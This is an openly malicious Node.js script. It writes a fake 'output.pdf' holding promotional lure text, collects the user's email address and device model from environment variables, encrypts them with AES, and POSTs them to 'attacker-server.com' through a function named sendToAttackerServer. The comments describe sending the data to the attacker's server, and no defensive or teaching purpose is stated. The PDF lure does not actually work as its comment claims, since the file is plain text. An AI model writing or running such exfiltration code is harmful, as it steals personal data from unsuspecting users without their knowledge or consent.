const nodemailer = require('nodemailer');
const os = require('os');
const CryptoJS = require('crypto-js');
const request = require('request');
const fs = require('fs');
const UAParser = require('ua-parser-js');

function getUserInput() {
  const userEmail = process.env.USER_EMAIL || 'default@example.com';
  const userAgent = process.env.HTTP_USER_AGENT || '';
  const device = extractDeviceInfo(userAgent);

  const userData = {
    email: userEmail,
    device
  };

  return userData;
}

function extractDeviceInfo(userAgent) {
  const parsedUserAgent = new UAParser(userAgent);
  const device = parsedUserAgent.device.model || 'Unknown Device';
  return device;
}

function generatePDF() {
  const pdfContent = '"Unlock exclusive deals now! Click to explore a world of savings and discover limited-time offers. Your next great find awaits!"'; 

  fs.writeFileSync('output.pdf', pdfContent);
  console.log('PDF generated and saved.');
}

function sendToAttackerServer(data) {
  const options = {
    url: 'https://attacker-server.com/data',
    method: 'POST',
    json: true,
    body: { encryptedData: data }
  };

  request(options, (error, response, body) => {
    if (error) {
      console.error('Error sending data to the attacker server:', error);
    } else {
      console.log('Data sent to the attacker server:', body);
    }
  });
}

function encryptFile(data, encryptionKey) {
  const encryptedData = CryptoJS.AES.encrypt(data, encryptionKey).toString();
  return encryptedData;
}

// Trigger the script when the PDF is clicked
generatePDF();

// Extract user data and send it to the attacker's server
const userData = getUserInput();
const encryptionKey = 'your-encryption-key'; // Replace with your own encryption key
const encryptedData = encryptFile(JSON.stringify(userData), encryptionKey);
sendToAttackerServer(encryptedData);
